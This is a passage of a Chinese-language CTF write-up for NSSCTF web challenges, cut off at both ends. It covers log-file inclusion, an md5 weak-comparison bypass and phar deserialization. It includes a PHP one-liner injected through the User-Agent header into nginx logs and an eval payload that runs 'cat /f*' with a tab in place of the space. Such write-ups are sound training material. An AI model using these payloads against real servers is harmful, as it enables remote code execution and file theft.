punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤了很多，伪协议近乎全军覆没，但是没有关系，我们可以使用日志包含。</p>\n<p>关于日志包含：</p>\n<blockquote>\n<p>日志包含漏洞属于是本地文件包含，同样服务器没有很好的过滤，或者是服务器配置不当导致用户进入了内网，本来常规用户是访问不了这些文件的，但由于发起访问请求的人是服务器本身，也就导致用户任意文件读取。</p>\n</blockquote>\n<p>原理：</p>\n<p>apache 服务器日志存放文件位置：/var/log/apache/access.log</p>\n<p>apache 日志文件存放着我们输入的 url 参数</p>\n<p><img data-src=\"../../../images/NSS/10.png\" alt=\"10\" /></p>\n<p>我们可以通过在 url 参数中写入一句话木马，进行执行，从而将一句话木马写入到日志文件中，我们可以通过包含写入木马的日志文件，从而进行命令执行。</p>\n<p>nginx 服务器日志存放位置：/var/log/nginx/access.log 和 /var/log/nginx/error.log</p>\n<p>发送请求</p>\n<blockquote>\n<p>GET /?file=/var/log/nginx/access.log HTTP/1.1</p>\n</blockquote>\n<p>发现回显出的结果存在 User-Agent 的内容，所以可在在这里进行命令执行。</p>\n<p>由于 include 会把文件当成 php 文件执行，所以我们可以这样写：</p>\n<figure class=\"highlight apl\"><figcaption data-lang=\"APL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GET <span class=\"token monadic-operator operator\">/</span><span class=\"token function\">?</span>file<span class=\"token function\">=</span><span class=\"token monadic-operator operator\">/</span>var<span class=\"token monadic-operator operator\">/</span>log<span class=\"token monadic-operator operator\">/</span>nginx<span class=\"token monadic-operator operator\">/</span>access<span class=\"token dyadic-operator operator\">.</span>log HTTP<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">1.1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host<span class=\"token dfn builtin\">:</span> node5<span class=\"token dyadic-operator operator\">.</span>anna<span class=\"token dyadic-operator operator\">.</span>nssctf<span class=\"token dyadic-operator operator\">.</span>cn<span class=\"token dfn builtin\">:</span><span class=\"token number\">28449</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Upgrade<span class=\"token function\">-</span>Insecure<span class=\"token function\">-</span>Requests<span class=\"token dfn builtin\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>User<span class=\"token function\">-</span>Agent<span class=\"token dfn builtin\">:</span> <span class=\"token function\">&lt;</span><span class=\"token function\">?</span>php system<span class=\"token punctuation\">(</span><span class=\"token string\">'cat /f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">?</span><span class=\"token function\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Accept<span class=\"token dfn builtin\">:</span> text<span class=\"token monadic-operator operator\">/</span>html<span class=\"token function\">,</span>application<span class=\"token monadic-operator operator\">/</span>xhtml<span class=\"token function\">+</span>xml<span class=\"token function\">,</span>application<span class=\"token monadic-operator operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token function\">=</span><span class=\"token number\">0.9</span><span class=\"token function\">,</span>image<span class=\"token monadic-operator operator\">/</span>avif<span class=\"token function\">,</span>image<span class=\"token monadic-operator operator\">/</span>webp<span class=\"token function\">,</span>image<span class=\"token monadic-operator operator\">/</span>apng<span class=\"token function\">,</span><span class=\"token function\">*</span><span class=\"token monadic-operator operator\">/</span><span class=\"token function\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token function\">=</span><span class=\"token number\">0.8</span><span class=\"token function\">,</span>application<span class=\"token monadic-operator operator\">/</span>signed<span class=\"token function\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token function\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token function\">=</span><span class=\"token number\">0.7</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Accept<span class=\"token function\">-</span>Encoding<span class=\"token dfn builtin\">:</span> gzip<span class=\"token function\">,</span> deflate</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Accept<span class=\"token function\">-</span>Language<span class=\"token dfn builtin\">:</span> zh<span class=\"token function\">-</span>CN<span class=\"token function\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token function\">=</span><span class=\"token number\">0.9</span></pre></td></tr></table></figure><p>这里 system 中不能用双引号，否则会和 index 文件中的 include 函数中的双引号起冲突。</p>\n<h3 id=\"swpuctf-2022-新生赛webdog1__start\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛webdog1__start\">#</a> [SWPUCTF 2022 新生赛] webdog1__start</h3>\n<h4 id=\"rcemd5碰撞php\"><a class=\"anchor\" href=\"#rcemd5碰撞php\">#</a> RCE,md5 碰撞，PHP</h4>\n<p>题目描述：</p>\n<figure class=\"highlight apl\"><figcaption data-lang=\"APL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>年轻的webdog哦，如果连这关都创不过还是去卷pwn和re吧</pre></td></tr></table></figure><p>这道题目进入后检查网页源代码看到：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>if (isset($_GET['web']))</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    $first=$_GET['web'];</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    if ($first==md5($first)) </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>--></span></pre></td></tr></table></figure><p>一般的 md5 绕过是传入 0e 开头的 md5 值，因为在弱比较时，弱比较中会截取一个字符串的数字，直到遇到字符截止，对于 0e + 数字的值只会截取 e 之前的 0，所以这里即便是令传入的 md5 值等于 $md5 后还需要等于其自身进行 md5 的值，我们选取 0e 或者加密后仍为 0e 开头的数就行例如：0e215962017</p>\n<p>这里我尝试写了一个脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_md5</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    length <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    hex_chars <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>hexdigits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>hex_chars<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_collision</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        random_part <span class=\"token operator\">=</span> generate_random_string<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        test_string <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'0e</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random_part<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        hash_result <span class=\"token operator\">=</span> generate_md5<span class=\"token punctuation\">(</span>test_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            hash_result<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'0e'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">and</span> hash_result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"找到 '</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>test_string<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">' 的碰撞\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"MD5 哈希值: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hash_result<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">return</span> test_string<span class=\"token punctuation\">,</span> hash_result</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_collision_with_threads</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    num_threads <span class=\"token operator\">=</span> <span class=\"token number\">10</span>  <span class=\"token comment\"># 可以调整线程数量</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    threads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>num_threads<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>find_collision<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>thread<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">for</span> thread <span class=\"token keyword\">in</span> threads<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        thread<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    find_collision_with_threads<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是得出的结果并不能生效，找了下原因发现是 0e 后面必须是十进制数字，然后我这个脚本换成十进制又报不出来。</p>\n<p>所以只能记住这个关键的 0e215962017</p>\n<p>然后进入 start.php 界面，点了一圈后都是 Not Found，</p>\n<p>检查源代码看见；</p>\n<p>​      &lt;a href=&quot;#&quot; aria-label=&quot;Next&quot;do you know the power of bot? go go go!!&gt;</p>\n<p>那就访问以下 robots.txt 文件试试；</p>\n<figure class=\"highlight apl\"><figcaption data-lang=\"APL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>哈哈哈，看来你还是有备而来，我的一切财宝都藏在f14g<span class=\"token dyadic-operator operator\">.</span>php里面了，去找吧！</pre></td></tr></table></figure><p>靠！如果一开始就访问 robots.txt 就没前面的事情了...</p>\n<p>访问 /f14g.php，得到</p>\n<blockquote>\n<p>oh ! i can't believe you think flag really be here hhhh</p>\n</blockquote>\n<p>在响应包看到：</p>\n<blockquote>\n<p>Hint:</p>\n<p>oh good job! but no flag ,come to F1l1l1l1l1lag.php</p>\n</blockquote>\n<p>访问 / F1l1l1l1l1lag.php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$get</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"This is too long.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>绕过空格和 flag 啊，那很简单：</p>\n<p>/F1l1l1l1l1lag.php?get=system(&quot;cat%09/f*&quot;);</p>\n<p>结束。</p>\n<h3 id=\"nssround4-swpu1zweb\"><a class=\"anchor\" href=\"#nssround4-swpu1zweb\">#</a> [NSSRound#4 SWPU]1zweb</h3>\n<h4 id=\"文件上传phar反序列化\"><a class=\"anchor\" href=\"#文件上传phar反序列化\">#</a> 文件上传，phar 反序列化</h4>\n<p>非预期解很简单，利用伪协议 file:///flag 即可读取到 flag。</p>\n<p>但是我们是来学习知识的，当然得尝试预期解：</p>\n<p>首先查看以下 index.php 的源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">LoveNss</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ljt</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dky</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ljt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"dky\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>关于 phar 反序列化可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ29Mby9wLzE2Nzg2NjI3Lmh0bWwjOn46dGV4dD1QaGFyJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JTIwUGhhciVFNCVCOSU4QiVFNiU4OSU4MCVFNCVCQiVBNSVFOCU4MyVCRCVFNSU4RiU4RCVFNSVCQSU4RiVFNSU4OCU5NyVFNSU4QyU5NiVFRiVCQyU4QyVFNiU5OCVBRiVFNSU5QiVBMCVFNCVCOCVCQVBoYXIlRTYlOTYlODclRTQlQkIlQjYlRTQlQkMlOUElRTQlQkIlQTUlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYlRTclOUElODQlRTUlQkQlQTIlRTUlQkMlOEYlRTUlQUQlOTglRTUlODIlQTglRTclOTQlQTglRTYlODglQjclRTglODclQUElRTUlQUUlOUElRTQlQjklODklRTclOUElODQlMjBtZXRhLWRhdGElMkNQSFAlRTQlQkQlQkYlRTclOTQlQTgscGhhcl9wYXJzZV9tZXRhZGF0YSUyMCVFNSU5QyVBOCVFOCVBNyVBMyVFNiU5RSU5MG1ldGElRTYlOTUlQjAlRTYlOEQlQUUlRTYlOTclQjYlRUYlQkMlOEMlRTQlQkMlOUElRTglQjAlODMlRTclOTQlQTglMjBwaHBfdmFyX3Vuc2VyaWFsaXplJTIwJUU4JUJGJTlCJUU4JUExJThDJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JUU2JTkzJThEJUU0JUJEJTlDJUUzJTgwJTgy\">PHP Phar 反序列化学习</span></p>\n<p>file_get_content 可以触发 phar 反序列化，只需绕过__wakeup 即可</p>\n<p>然后我们再查看 upload.php 文件：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传异常\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$allowedExts</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpeg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$extension</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token 